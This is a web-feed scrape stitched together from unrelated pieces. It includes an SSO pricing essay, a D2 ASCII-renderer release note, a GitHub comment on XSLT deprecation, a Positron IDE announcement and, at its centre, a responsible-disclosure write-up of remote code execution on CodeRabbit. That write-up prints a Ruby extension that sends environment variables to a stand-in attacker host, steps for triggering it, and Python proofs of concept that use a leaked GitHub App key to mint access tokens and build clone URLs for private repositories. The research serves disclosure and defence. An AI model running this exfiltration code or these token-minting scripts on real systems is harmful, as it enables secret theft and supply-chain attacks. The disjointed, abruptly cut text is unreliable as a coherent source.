  <summary>
    <p>Why does this exist?</p>
  </summary>
  <p>Single sign-on (SSO) is a mechanism for outsourcing the authentication for your website (or other product) to a third party identity provider, such as Google, Okta, Entra ID (Azure AD), PingFederate, etc.</p>

  <p>In this context, SSO refers to a SaaS or similar vendor allowing a business client to manage user accounts via the client’s own identity provider, without having to rely on the vendor to provide strong authentication with audit logs, and with the ability to create and delete user accounts centrally, for all users, across all software in use by that client.</p>

  <p>For organizations with more than a handful of employees, this feature is critical for IT and Security teams to be able to effectively manage user accounts across dozens or hundreds of vendors, many of which don’t support features like TOTP 2FA or U2F. In the event that an employee leaves the company, it allows the IT team to immediately disable their access to all applications, rather than logging into 100 different user management portals.</p>

  <p>In short: SSO is a core security requirement for any company with more than five employees.</p>

  <p>SaaS vendors appear not to have received this message, however. SSO is often only available as part of “Enterprise” pricing, which assumes either a huge number of users (minimum seat count) or is force-bundled with other “Enterprise” features which may have no value to the company using the software.</p>

  <p>If companies claim to “take your security seriously”, then SSO should be available as a feature that is either:</p>

  <ol>
    <li>part of the core product, or</li>
    <li>an optional paid extra for a reasonable delta, or</li>
    <li>attached to a price tier, but with a reasonably small gap between the non-SSO tier and SSO tiers.</li>
  </ol>

  <p>Many vendors charge 2x, 3x, or 4x the base product pricing for access to SSO, which disincentivizes its use and encourages poor security practices.</p>

<h2 id="faqs">FAQs</h2>

<details>
  <summary>
    <p>This doesn’t scale linearly for number of seats!</p>
  </summary>
  <p>Correct. Since we don’t know who’s reading the page, it’s easiest to just assume a team with no volume discount.</p>
</details>

<details>
  <summary>
    <p>How is base pricing determined?</p>
  </summary>
  <p>We disregard free tier pricing, as we can assume these aren’t intended for long term business customer use. We also disregard “single person” pricing, under the assumption that we’re looking on behalf of a team of 5, 10, or more people.</p>
</details>

<details>
  <summary>
    <p>What does “Quote” mean in the Source column?</p>
  </summary>
  <p>If a vendor doesn’t list pricing but a user has submitted pricing based on a quote, it can be included here. If a vendor feels that their actual pricing is inaccurately reflected by this quote, feel free to let me know and I’ll update the page.</p>
</details>

<details>
  <summary>
    <p>I’m a vendor and this data is wrong!</p>
  </summary>
  <p>Please feel free to submit a PR to this page, or reach out at sso @ myGitHubUsername dotcom. I only want this data to be accurate.</p>
</details>

<details>
  <summary>
    <p>I’m a vendor and this doesn’t reflect the value-add of our Enterprise tier!</p>
  </summary>
  <p>That’s the point. Decouple your security features from your value-added services. They should be priced separately.</p>
</details>

<details>
  <summary>
    <p>But it costs money to provide SAML support, so we can’t offer it for free!</p>
  </summary>
  <p>While I’d like people to really consider it a <em>bare minimum</em> feature for business SaaS, I’m OK with it costing a little extra to cover maintenance costs. If your SSO support is a 10% price hike, you’re not on this list. But these percentage increases are not maintenance costs, they’re revenue generation because you know your customers have no good options.</p>

            <pubDate>Tue, 19 Aug 2025 18:14:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://d2lang.com/blog/ascii/">https://d2lang.com/blog/ascii/</a>, See on <a href="https://news.ycombinator.com/item?id=44954524">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="__blog-post-container"><p>In the latest release of D2 (0.7.1), we introduce ASCII outputs.</p>
<p>Any output file with extension <code>txt</code> will use the ASCII renderer to write to it.</p>
<!-- -->
<p>Here is an example of their rendering from the <a href="https://github.com/terrastruct/d2-vim" target="_blank" rel="noopener noreferrer">D2 Vim extension</a>. The user opens a <code>.d2</code> file and opens a preview window, which updates upon every save.</p>
<p><img decoding="async" loading="lazy" alt="D2 Vim preview" src="https://d2lang.com/assets/images/preview-d04cd1ad32fec06203b93a3ac64d903f.gif" width="1159" height="1470"></p>
<h2 id="code-documentation">Code documentation<a href="#code-documentation" aria-label="Direct link to Code documentation" title="Direct link to Code documentation">​</a></h2>
<p>Perhaps the most useful place for ASCII diagrams is in the source code comments. Small
simple diagrams next to functions or classes can serve to be much clearer than describing
a flow.</p>
<p>Here again the Vim extension demonstrates a functionality to write some d2 code and
replace the selection with the ASCII render.</p>
<p><img decoding="async" loading="lazy" alt="D2 Vim replace" src="https://d2lang.com/assets/images/replace-7658a2addaa42da73547218f1cffe1d5.gif" width="1159" height="1470"></p>
<h2 id="unicode-and-standard-ascii">Unicode and standard ASCII<a href="#unicode-and-standard-ascii" aria-label="Direct link to Unicode and standard ASCII" title="Direct link to Unicode and standard ASCII">​</a></h2>
<p>The default character set of ASCII renders is unicode, which has nicer box-drawing
characters. If you'd like true ASCII for maximum portability, you can specify this with
the flag <code>--ascii-mode=standard</code>.</p>
<h2 id="limitations">Limitations<a href="#limitations" aria-label="Direct link to Limitations" title="Direct link to Limitations">​</a></h2>
<div><p><span><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Alpha</p><p>Note that the ASCII renderer should be considered in alpha stage. There will be many
corner cases, areas of improvements, and outright bugs. If you enjoy using it, we'd
appreciate you taking the time to file any issues you run into:
<a href="https://github.com/terrastruct/d2/issues" target="_blank" rel="noopener noreferrer">https://github.com/terrastruct/d2/issues</a>.</p></div>
<p>The ASCII renderer is a downscale of the layout determined by the ELK layout engine with
some post-processing to further compact it.</p>
<ul>
<li>No styles are supported<!-- -->
<ul>
<li>Some will never be, e.g. <code>animated</code> and <code>font</code> don't make sense in ASCII.</li>
<li>Some may in the future with limited scope, e.g. colors when rendered to terminal.<!-- -->
<ul>
<li>By extension, themes are moot</li>
</ul>
</li>
<li>Some should be considered TODOs, e.g. <code>double-border</code> and <code>multiple</code></li>
</ul>
</li>
<li>Uneven spacing<!-- -->
<ul>
<li>Sometimes the downscaling results in a box with uneven spacing, e.g. a rectangle with
width 5 and the label is 2 chars. Due to discrete coordinate space in ASCII renders, some
outputs may look less even than their SVG counterparts.</li>
</ul>
</li>
</ul>

While it does the job, ever since I <a href="https://xenodium.com/seek-and-you-shall-find">added a "graphical" seeker to Ready Player Mode</a>, I had been meaning to build a simple video trimming tool of sorts.

<div id="readability-page-1" class="page"><div>

		
<p>In this blog post, we explain how we got remote code execution (RCE) on CodeRabbit’s production servers, leaked their API tokens and secrets, how we could have accessed their PostgreSQL database, and how we obtained read and write access to 1 million code repositories, including private ones.</p>



<p>This blog post is a detailed write-up of one of the vulnerabilities we disclosed at <a href="https://research.kudelskisecurity.com/2025/08/07/hack-to-the-future-slides-and-content/">Black Hat USA</a> this year. The details provided in this post are meant to demonstrate how these security issues can manifest and be exploited in the hopes that others can avoid similar issues. This is not meant to shame any particular vendor; it happens to everyone. Security is a process, and avoiding vulnerabilities takes constant vigilance. </p>



<p><strong>Note:</strong> <strong>The security issues documented in this post were remediated in January of 2025.</strong> See the Responsible Disclosure section for more details. </p>



<h2>Introduction</h2>



<p>Last December, I spoke at 38C3 in Hamburg and <a href="https://research.kudelskisecurity.com/2024/08/29/careful-where-you-code-multiple-vulnerabilities-in-ai-powered-pr-agent/">covered 2 security flaws</a> I discovered in Qodo Merge. After getting off the stage, someone came to me and asked whether I had looked at other AI code review tools, such as CodeRabbit. I thanked them and said this would be a great target to have a look at. Fast forward a couple of weeks, and here I am, having a look at their security.</p>



<h2>What is CodeRabbit?</h2>

<p>Once CodeRabbit is installed on a repository, every time a new pull request (PR) is created or updated, CodeRabbit will analyze the code changes in the PR and review them using AI. CodeRabbit will finally post its code review as a comment on the pull request, where the developer can read it.</p>



<p>This is a very useful developer productivity tool that can summarize PRs, find security issues in the code, suggest code improvements or even document the code or illustrate it by generating diagrams. It can save developers a lot of time.</p>



<h2>Trying out CodeRabbit</h2>



<p>CodeRabbit has multiple pricing plans, and one of them is called Pro. That one includes support for linters and SAST tools, such as Semgrep. Alternatively, there’s a free 14-day trial for the Pro plan. Also, the Pro plan comes for free for people working on open source projects.</p>

<p>When first logging into CodeRabbit using GitHub, the application asks to install and authorize on a personal GitHub account. The user is asked to select which repositories CodeRabbit should be installed to. The user can also review the permissions that the CodeRabbit GitHub app will be granted. Namely, read and write access to code in the selected repositories.</p>

<p>At this point, this sounded very similar to what happened with Qodo Merge. I had to look into it. If somehow we could leak the GitHub API token, we would get read and write access to the repository in which CodeRabbit was installed.</p>



<p>I immediately created a private GitHub repository on my personal GitHub account and granted CodeRabbit access to that new repository so that it starts reviewing my PRs on that repo.</p>



<p>In order to get more familiar with CodeRabbit’s features and how to use them, I created a PR and saw that a comment containing a code review was posted by the CodeRabbit bot. Here are a few screenshots of what CodeRabbit generated.</p>

<p>Now that I had a better idea of how it worked, I could start looking for vulnerabilities. </p>



<h2>Exploiting external tools</h2>



<p>I had a look at the official CodeRabbit documentation and noticed that CodeRabbit supported running <a href="https://docs.coderabbit.ai/tools/">dozens of static analysis tools</a>. These are the linters and SAST tools mentioned on the CodeRabbit pricing page discussed above.</p>



<p>CodeRabbit runs these tools on your PR changes depending on a few conditions:</p>



<ul>
<li>The tool is enabled in the CodeRabbit configuration</li>



<li>The PR contains large enough changes to trigger a run of such tools. Small changes will be ignored and no tool will run on those</li>



<li>The PR contains files supported by the tool. For example, PHPStan will only run on files with the <code>.php</code> extension</li>
</ul>



<p>Some tools are enabled by default and will run if corresponding files exist. Otherwise, a <code>.coderabbit.yaml</code> file placed in the repository can be used to configure which tools should be enabled. Alternatively, the CodeRabbit web app settings can be used to configure tools.</p>



<p>The documentation page also states that each tool can be configured by providing a path to a configuration file read by the tool. Now we’re talking!</p>



<p>Since CodeRabbit executes these external tools, if any of these tools have a way to inject code, we may be able to run arbitrary code. So I glanced over the list of supported tools and found an interesting target: <a href="https://docs.coderabbit.ai/tools/rubocop">Rubocop</a>, a Ruby static analyzer. The CodeRabbit documentation page for Rubocop states that Rubocop will run on Ruby files (<code>.rb</code>) in the repository. It also says that CodeRabbit will look for a <code>.rubocop.yml</code> file anywhere in the repository and pass it to Rubocop.</p>

<p><br>Looking at Rubocop’s documentation, we see that it supports <a href="https://docs.rubocop.org/rubocop/1.69/extensions.html">extensions</a>. One can use the Rubocop configuration file to specify the path to an extension Ruby file, for example, <code>ext.rb</code>, which will be loaded and executed by Rubocop. To do so, one can include the following snippet in <code>.rubocop.yml</code>:</p>





<p>In <code>ext.rb</code>, we can write arbitrary Ruby code that will be loaded and executed when Rubocop runs. We’ll use 1.2.3.4 as an example IP address that stands in for an attacker-controlled system. For example, the following Ruby script will collect the environment variables and send them to an attacker-controlled server at <code>1.2.3.4</code>:</p>


<div><pre title="">require 'net/http'
require 'uri'
require 'json'

# Collect environment variables
env_vars = ENV.to_h

# Convert environment variables to JSON format
json_data = env_vars.to_json

# Define the URL to send the HTTP POST request
url = URI.parse('http://1.2.3.4/')

begin
  # Create the HTTP POST request
  http = Net::HTTP.new(url.host, url.port)
  request = Net::HTTP::Post.new(url.path)
  request['Content-Type'] = 'application/json'
  request.body = json_data

  # Send the request
  response = http.request(request)
rescue StandardError =&gt; e
  puts "An error occurred: #{e.message}"
end
</pre></div>


<p>Exploiting this is as simple as following these steps:</p>



<ul>
<li>Get a free trial on CodeRabbit and register using a personal GitHub account</li>



<li>Create a private repository and grant CodeRabbit access to it, so that it reviews PRs on that repository</li>



<li>Create a PR that contains the following files:
<ul>
<li>A <code>.rubocop.yml</code> file as shown above</li>



<li>An <code>ext.rb</code> file as shown above</li>



<li>Any other large enough dummy Ruby file so that CodeRabbit triggers the execution of Rubocop and does not skip the file</li>
</ul>
</li>



<li>Wait for CodeRabbit to perform the code review and run our malicious ext.rb file</li>



<li>Collect the exfiltrated environment variables in the HTTP POST request received on our attacker-controlled server at 1.2.3.4</li>
</ul>



<p>Here’s an illustration of our malicious pull request to better understand how it works:</p>

<h2>Unpacking what we found</h2>



<p>After we created our malicious PR, CodeRabbit ran Rubocop on our code, which executed our malicious code and sent its environment variables to our server at 1.2.3.4.</p>



<p>On the server at <code>1.2.3.4</code>, the following JSON payload containing environment variables was received:</p>

<p>That payload contained so many secrets that it actually took me a few minutes to grasp what we had gotten access to. The environment variables contained, notably:</p>



<ul>
<li>Anthropic API keys (free, oss, paid, trial, etc.)</li>



<li>OpenAI API keys (free, oss, paid, trial, etc.)</li>



<li>Aperture agent key</li>



<li>Courier auth token</li>



<li>Encryption password and salt</li>



<li>Gitlab personal access token</li>



<li>CodeRabbit GitHub App private key, app client id, app client secret, app id</li>



<li>Jira secret</li>



<li>Langchain/langsmith API key</li>



<li>LanguageTool API key</li>



<li>Pinecone API key</li>



<li>PostgreSQL database host, username and password</li>
</ul>



<p>Leaking environment variables is one thing, but since we obtained remote code execution (RCE) on that server, there is even more that an attacker could have done. Indeed, they could connect to the Postgres database server on the internal network. They could perform destructive operations. They could likely obtain the source code of the CodeRabbit app itself which is potentially somewhere in the Docker container where the external tool runs.</p>



<p>Before exploring the leaked environment variables further, we performed a few minimal reconnaissance operations, such as listing a few directories and reading the contents of a couple files on the production system, just to confirm the impacts. But this process was not really efficient and we were not able to quickly confirm the presence of the original source code of the CodeRabbit webapp there. However, the built application was there in the <code>/app/pr-reviewer-saas/dist</code> directory.<br>Additionally, since this was a production server, we didn’t want to do anything that could disrupt the CodeRabbit service and decided to stop there.<br>But there was more. Let’s go back to the exfiltrated environment variables.</p>



<h2>Getting Read/write access to 1M repositories</h2>



<p>As mentioned above, one of the environment variables was named <code>GITHUB_APP_PEM_FILE</code> and its value contained a private key. This is actually the private key of the CodeRabbit GitHub app. This private key can be used to authenticate to the GitHub REST API and act on behalf of the CodeRabbit GitHub app. Since users of CodeRabbit have granted CodeRabbit write access to their repositories, this private key gives us write access to 1 million repositories!</p>



<p>Let’s go through a few operations that one can perform with this private key.</p>



<h3>Listing installations of the CodeRabbit app</h3>



<p>As of writing, the CodeRabbit GitHub app was installed over 80’000 times. Basically, this tells us that at least that amount of GitHub personal accounts or organizations installed CodeRabbit and use it for at least one of their repositories. But these accounts may very well have granted access to more than one repository, or even all of their repositories.</p>



<p>The CodeRabbit website states that they review 1M repositories. These include GitHub repositories, but likely also repositories from other platforms that CodeRabbit supports, such as Gitlab, and on-premises git providers.</p>



<p>We will see below (see Proof of concept) how one can programatically list GitHub app installations using the GitHub API.</p>



<h3>Listing GitHub repositories CodeRabbit has access to</h3>



<p>For a given installation, one can list the GitHub repositories to which this installation has been granted access.</p>



<p>We can also see that the installation has read/write access to the code of the repository, among other permissions. For reference, this is the list of permissions the CodeRabbit app has on the repositories it has access to:</p>


<div><pre title="">"permissions": {
    "actions": "read",
    "checks": "read",
    "contents": "write",
    "discussions": "read",
    "issues": "write",
    "members": "read",
    "metadata": "read",
    "pull_requests": "write",
    "statuses": "write"
  },
</pre></div>


<p>Note that these permissions are public information that anyone can <a href="https://api.github.com/apps/coderabbitai">see here</a>.</p>



<h3>Generating an access token valid for repositories that CodeRabbit has access to</h3>



<p>A GitHub API access token can be created for the CodeRabbit app installation. This access token has all the permissions listed above and can be used on all the repositories the app installation has access to. It can be used to, for example, clone the repository or push git commits to it, since we not only have read access but also write access to the <code>contents</code>. This can also be used to update GitHub releases, including the downloadable files (the assets), and replace them with malware and therefore serve malware directly from the targeted official GitHub repository.</p>



<p>The access token is valid for at most 10 minutes, but since we have the private key, more access tokens can be generated at any time, even if they expire.</p>



<h3>Cloning private repositories CodeRabbit has access to</h3>



<p>But this gets even scarier. Generated access tokens can also be used to clone private repositories (!) that the user has granted CodeRabbit access to. Indeed, as long as the user has granted CodeRabbit access to a repository, the private key can be used to access it. It doesn’t matter if it’s public or private.<br>Therefore, a malicious person could exploit the vulnerability to leak the CodeRabbit GitHub app private key, list all the installations, list each repository, generate an access token for each repository, and clone private repositories, serve malware from public repositories or manipulate the git history of a repository. This could be used to perform lateral movement and potentially leak GitHub repository secrets of the GitHub repository through GitHub actions if the targeted repository contains vulnerable GitHub actions.</p>



<h2>Proof of concept</h2>



<p>Here’s an example of how this can be achieved using the PyGitHub Python library, assuming that the private key is stored in a file called <code>priv.pem</code> and that we have the app ID and client ID (also leaked from the environment variables):</p>


<div><pre title="">#!/usr/bin/env python3  
import json  
import time  

import jwt  
import requests  
from github import Auth, GithubIntegration  

with open("priv.pem", "r") as f:  
    signing_key = f.read()  

app_id = "TODO_insert_app_id_here"  
client_id = "Iv1.TODO_insert_client_id_here"  


def gen_jwt():  
    payload = {  
        # Issued at time  
        'iat': int(time.time() - 60),  
        # JWT expiration time (10 minutes maximum)  
        'exp': int(time.time()) + 600 - 60,  
        # GitHub App's client ID  
        'iss': client_id  
    }  

    # Create JWT  
    encoded_jwt = jwt.encode(payload, signing_key, algorithm="RS256")  
    return encoded_jwt  


def create_access_token(install_id, jwt):  
    response = requests.post(  
        f"https://api.github.com/app/installations/{install_id}/access_tokens",  
        headers={  
            "Accept": "application/vnd.github+json",  
            "Authorization": f"Bearer {jwt}",  
            "X-GitHub-Api-Version": "2022-11-28",  
        }  
    )  
    j = response.json()  
    access_token = j["token"]  
    return access_token  


def auth():  
    auth = Auth.AppAuth(app_id, signing_key)  
    gi = GithubIntegration(auth=auth)  
    app = gi.get_app()  

    # iterate through app installations, get the first 5  
    for installation in gi.get_installations().reversed[:5]:  
        install_id = installation.id  

    # or access an installation by its ID directly  
    installation = gi.get_app_installation(install_id)  

    jwt = gen_jwt()  
    create_access_token(install_id, jwt)  

    # get all github repositories this installation has access to  
    repos = installation.get_repos()  
    for repo in repos:  
        full_name = repo.full_name  
        stars = repo.stargazers_count  
        html_url = repo.html_url  
        is_private_repo = repo.private  
        clone_url = f"https://x-access-token:{access_token}@github.com/{full_name}.git"  
        print(clone_url)  

        # repo can be cloned with "git clone {clone_url}"  
        # access token is valid for 10 minutes, but a new one can be generated whenever needed  

if __name__ == "__main__":  
    auth()
</pre></div>


<p>Obviously, iterating through the list of all GitHub installations of the CodeRabbit app would have required making thousands of requests to the GitHub API on behalf of the production CodeRabbit GitHub app and this may have exceeded the API quota. We didn’t want to risk disrupting the production CodeRabbit service so we only iterated through a couple installations to confirm the PoC was working.</p>



<h2>Leaking CodeRabbit’s private repositories</h2>



<p>We mentioned earlier that we couldn’t confirm the presence of the original source code of CodeRabbit on the production Docker container. Well, since CodeRabbit eats their own dog food, they run CodeRabbit on their own GitHub repositories. We can therefore easily retrieve the app installation ID for their GitHub organization and list the repositories this app installation has access to.</p>



<p>This is the list of private repositories the coderabbitai GitHub organization has granted CodeRabbit access to:</p>



<ul>
<li><a href="https://github.com/coderabbitai/mono" rel="nofollow">https://github.com/coderabbitai/mono</a></li>



<li><a href="https://github.com/coderabbitai/pr-reviewer-saas" rel="nofollow">https://github.com/coderabbitai/pr-reviewer-saas</a></li>

<li><a href="https://github.com/coderabbitai/hubspot-reporting" rel="nofollow">https://github.com/coderabbitai/hubspot-reporting</a></li>
</ul>



<p>To go further, one can generate an access token (as explained above) and clone these private repositories, including what looks like their monorepo (<code>coderabbitai/mono</code>) or the <code>coderabbitai/pr-reviewer-saas</code> repository.</p>



<p>Here’s the PoC to do this. Note that it’s similar to the above, except that we directly retrieve the app installation for a specific GitHub organization by its name, instead of iterating through all the installations:</p>


<div><pre title="">#!/usr/bin/env python3  
import time  

import jwt  
import requests  
from github import Auth, GithubIntegration  

with open("priv.pem", "r") as f:  
    signing_key = f.read()  

app_id = "CENSORED"  
client_id = "CENSORED"  


def gen_jwt():  
    payload = {  
        # Issued at time  
        'iat': int(time.time() - 60),  
        # JWT expiration time (10 minutes maximum)  
        'exp': int(time.time()) + 600 - 60,  
        # GitHub App's client ID  
        'iss': client_id  
    }  

    # Create JWT  
    encoded_jwt = jwt.encode(payload, signing_key, algorithm="RS256")  
    return encoded_jwt  


def auth():  
    auth = Auth.AppAuth(app_id, signing_key)  
    gi = GithubIntegration(auth=auth)  

    # Target a specific Github organization that uses CodeRabbit  
    org = "coderabbitai"    
    installation = gi.get_org_installation(org)  

    # Target a specific Github user that uses CodeRabbit
    # user = "amietn"  
    # installation = gi.get_user_installation(user)  

    print(installation.id)  
    gen_token = True  

    if gen_token:  
        jwt = gen_jwt()  
        response = requests.post(  
            f"https://api.github.com/app/installations/{installation.id}/access_tokens",  
            headers={  
                "Accept": "application/vnd.github+json",  
                "Authorization": f"Bearer {jwt}",  
                "X-GitHub-Api-Version": "2022-11-28",  
            }  
        )  
        j = response.json()  
        access_token = j["token"]  

    repos = installation.get_repos()  
    print("---repos---")  
    for repo in repos:  
        full_name = repo.full_name  
        html_url = repo.html_url  
        private = repo.private  
        if private:  
            print(f"* {full_name} ({private=}) - {html_url}")  

            if gen_token:  
                clone_url = f"https://x-access-token:{access_token}@github.com/{full_name}.git"  
                print(clone_url)  


if __name__ == "__main__":  
    auth()
</pre></div>


<p>In a similar way, a malicious person could target not only a specific GitHub organization but also a specific GitHub personal account that uses CodeRabbit and access their private repositories and/or modify them.</p>



<p>As you can see, one can directly obtain the app installation ID for an organization or a user. So, this way there is no need to iterate through all the GitHub app installations to find a specific GitHub user or organization. Only the organization or user’s name is required.</p>



<h2>Impacts summary</h2>



<p>Let’s take a moment to summarize the impacts of getting write access to these 1 million repositories. A malicious person could have performed the following operations on affected repositories:</p>



<ul>
<li>Access private GitHub repositories nobody was ever supposed to access. This is a privacy breach.</li>



<li>Modify the git history of affected GitHub repositories – Note that this can be a supply chain attack since GitHub repositories are often the source for building software before it’s distributed</li>



<li>Modify existing GitHub releases and replace or add malicious downloadable files – Supply chain attack</li>



<li>Further lateral moves to potentially leak GitHub repository secrets by exploiting existing vulnerable GitHub actions by pushing git commits – Note that since the CodeRabbit GitHub app doesn’t have write permission to workflows, GitHub actions can’t be directly modified. However, a vulnerable GitHub action may be exploited more easily with write access to the git repository. See the talk I gave at 38C3 for more details on how we found an instance where this was exploitable.</li>
</ul>



<p>Additionally, we obtained RCE on the CodeRabbit production system. A malicious person could have performed destructive operations, caused a denial of service, or performed malicious operations on third party systems (see list of leaked secrets above).</p>



<h2>Context is key</h2>



<p>While running the exploit, CodeRabbit would still review our pull request and post a comment on the GitHub PR saying that it detected a critical security risk, yet the application would happily execute our code because it wouldn’t understand that this was actually running on their production system.</p>

<h2>Remediation</h2>



<p>CodeRabbit supports running dozens of external tools. These tools may get updates and new tools may be supported. Both cases may open the door to new ways of running arbitrary code. Therefore, trying to prevent arbitrary code execution through these tools sounds like an impossible task.</p>



<p>Instead, it would be best to assume that the user may be able to run untrusted code through these tools. So, running them in an isolated environment, with only the minimum information required to run the tools themselves, and not passing them any environment variables would be much better. Even if arbitrary code execution would be possible, the impact would be much less severe.</p>



<p>For defense in depth, one should add a mechanism that prevents sending private information to an attacker-controlled server. For example, only allow outgoing traffic to whitelisted hosts, if possible. If the tool doesn’t require internet access, then all network traffic may even be disabled in that isolated environment. This way it would make it harder for an attacker to exfiltrate secrets.</p>



<h2>Responsible disclosure</h2>



<p>After responsibly disclosing this critical vulnerability to the CodeRabbit team, we learned from them that they had an isolation mechanism in place, but Rubocop somehow was not running inside it. The CodeRabbit team was extremely responsive and acknowledged receipt of the disclosure the same day. They immediately disabled Rubocop and rotated the secrets and started working on a fix. The next week they told us that the vulnerability had been fixed. Kudos to the CodeRabbit team for responding promptly and fixing the issue.</p>



<p>Here is a summary of the disclosure timeline:</p>



<ul>
<li>January 24, 2025:
<ul>
<li>Disclose vulnerability to CodeRabbit</li>



<li>CodeRabbit acknowledges vulnerability and confirms they are working on a fix</li>
</ul>
</li>



<li>January 30, 2025:
<ul>
<li>CodeRabbit confirms fix</li>
</ul>
</li>
</ul>



<h2>Conclusions</h2>



<p>In the end, we only provided PoCs and didn’t take things further. A patient attacker could have enumerated the available access, identified the highest value targets, and then attacked those targets to distribute malware to countless others in a larger supply chain attack. Security is hard, and a variety of factors can come together to create security issues. Being quick to respond and remediate, as the CodeRabbit team was, is a critical part of addressing vulnerabilities in modern, fast-moving environments. Other vendors we contacted never responded at all, and their products are still vulnerable.</p>



<p>In the race to bring AI-powered products to market, many companies prioritize speed over security. While rapid innovation is exciting, overlooking security can have catastrophic consequences, as we’ve seen. The solution isn’t to stop but to build security into the development process from day one. By making security a core priority, AI companies can create products that are not only groundbreaking but also resilient and responsible. After all, true innovation isn’t just about moving fast. It’s about building something resilient and safe for users.</p>

<div id="readability-page-1" class="page"><div disabled="" sortable="">
          <p dir="auto">First, my apologies for commenting here; <a data-error-text="Failed to load title" data-id="3285251497" data-permission-text="Title is private" data-url="https://github.com/whatwg/html/issues/11523" data-hovercard-type="issue" data-hovercard-url="/whatwg/html/issues/11523/hovercard" href="https://github.com/whatwg/html/issues/11523">#11523</a> was (rightfully) locked while I was in the middle of composing this comment, but I didn't see any of these points mentioned elsewhere in that thread, so I'm adding it here.</p>
<hr>
<ol dir="auto">
<li>
<p dir="auto">Do any of your usage statistics show the age and “size” (popularity) of pages that use XSLT?</p>
<p dir="auto">Because if XSLT is mainly used by large commercial sites that are frequently updated, then deprecating the builtin support seems reasonable, since most of the sites will quickly update to include a polyfill. But if XSLT is mainly used by small personal sites that were last updated decades ago, then I wouldn't expect many of these sites to (ever) update, meaning that removing XSLT support would just mean that these sites will be broken forever.</p>
<p dir="auto">Given that XSLT has been supported since 1999 and its usage has been trending downwards, I suspect that the affected sites will mainly fall into the second category, meaning that the most likely outcome is site breakage rather than sites updating to use a polyfill.</p>
</li>
<li>
<p dir="auto">Well-built web pages use progressive enhancement, so even if any particular JavaScript/CSS feature is broken/removed, the page should still continue to partially work. So if JavaScript support for <code>XSLTProcessor()</code> is removed, then at the worst, all the JavaScript on a page will be broken, but the rest of the page should still be usable.</p>
<p dir="auto">However, removing support for <code>&lt;?xml-stylesheet … ?&gt;</code> seems particularly problematic, because if that is no longer supported, then users will simply see raw, unformatted XML, which makes the page completely unusable for non-technical users.</p>
</li>
<li>
<p dir="auto">Previous web platform deprecations have mainly affected JavaScript, and occasionally (or maybe never, I can't find any examples) CSS. Many legacy HTML features have been deprecated, but as far as I'm aware, all of them still work with all modern browsers. Some random examples:</p>
<ul dir="auto">
<li><a href="https://caniuse.com/mdn-html_elements_font" rel="nofollow"><code>&lt;font&gt;</code></a></li>
<li><a href="https://caniuse.com/mdn-html_elements_th_align" rel="nofollow"><code>align=</code></a></li>
<li><a href="https://caniuse.com/mdn-html_elements_xmp" rel="nofollow"><code>&lt;xmp&gt;</code></a></li>
</ul>
<p dir="auto">So while previous removals may have broken complex/interactive web apps, or may have caused minor format/layout changes, nothing has outright removed features used by pure “documents” (as in things that you could print on paper). However, many traditional documents use <code>&lt;?xml-stylesheet … ?&gt;</code>, so its removal seems unprecedented. But I may be completely wrong here, so please feel free to correct me.</p>
</li>
</ol>

<p dir="auto">Personal note: I maintain a site that uses <code>XSLTProcessor()</code> interactively and that separately uses <code>&lt;?xml-stylesheet … ?&gt;</code> for RSS feeds; it would be slightly annoying if I had to add a polyfill, but I'd have no problem updating it before any browser changes are introduced, so no users will ever experience any breakage.</p>
<p dir="auto">However, my main concern is for the “long tail” of the web—there's lots of vital information only available on random university/personal websites last updated before 2005, or are only available on the <a href="https://archive.org/" rel="nofollow">Internet Archive</a>. Many of these sites use <code>&lt;?xml-stylesheet … ?&gt;</code> (and other obsolete features not discussed here like <code>&lt;frameset&gt;</code> and <code>&lt;font&gt;</code>), and it would be a real shame if these sites stopped working.</p>

                                <p>We are excited to introduce <a href="https://positron.posit.co/"><b>Positron</b></a>, a free, next-generation Integrated Development Environment (IDE) for data science by Posit PBC. Positron brings the spectrum of exploration and production work together in one environment so you can move from ideation to insight to application without switching context. Ultimately, we have taken all the learnings from the 14+ years of building RStudio, and applied them to a new platform that treats Python and R as equals.&nbsp;</p>
<p>It is a great time to start using Positron, as we’ve now released our second Positron desktop stable release as of <a href="https://positron.posit.co/download.html#release-notes">2025.08.0</a> after 2+ years of development. The upcoming release of <a href="https://posit.co/products/enterprise/workbench/">Posit Workbench</a> will also introduce Positron sessions as a generally available IDE type.</p>
<p>If you are wondering about RStudio, please don’t worry – it’s not going away! RStudio includes 14+ years of R focused optimizations and we are committed to maintaining and updating RStudio. For more information, please read the <a href="https://positron.posit.co/faqs.html#is-rstudio-going-away">FAQ for RStudio users</a>.</p>

<h2>Why Positron and why now?</h2>

<p>When RStudio, PBC became <b>Posit, PBC</b> in 2022, we committed to supporting multi‑language, open‑source data science. This has included introducing <a href="https://quarto.org/">Quarto</a>, <a href="https://shiny.posit.co/py/">Shiny for Python</a> in addition to R, and broad support for both Python and R in our open-source packages and <a href="https://posit.co/products/enterprise/team/">Posit Team</a> suite of professional tools. Today, data teams work in both R and Python, often within the same group and sometimes even within the same project.&nbsp;</p>
<p><a href="https://positron.posit.co/">Positron</a> is designed for that world, and ultimately, our goal for Positron is to create an IDE for data science that supports the full scope of modern scientific and data-driven work, across languages, tools, and workflows. We aim to do this by:</p>
<ul>
<li aria-level="1">Providing a cohesive and thoughtful experience for writing code, performing analyses, and exploring data. Whether you’re working in Python, R, or both, Positron combines notebooks, scripts, and consoles with native support for plotting and data output. Positron is also built to support additional languages, such as SQL, in the future.</li>
<li aria-level="1">Supporting the kinds of workflows that are central to data science. This includes iterative development, rich interactive output, and publication-quality documents. Positron provides built-in support for notebooks, Quarto, data apps, and more, enabling a range of common authoring and analysis tasks.</li>
<li aria-level="1">Offering a modern, extensible editor built on open standards. Positron is built on Code OSS, the same foundation as Visual Studio Code, with custom features and UI elements designed specifically for data science. This includes support for a wide array of VSIX extensions and customization, while also enabling deeper integration of language-specific tools.</li>
</ul>
<p>We believe that powerful, user-friendly, and open tools are essential for scientific computing. Positron is freely available, aligning with our goal to make high-quality data science tools accessible to everyone.</p>

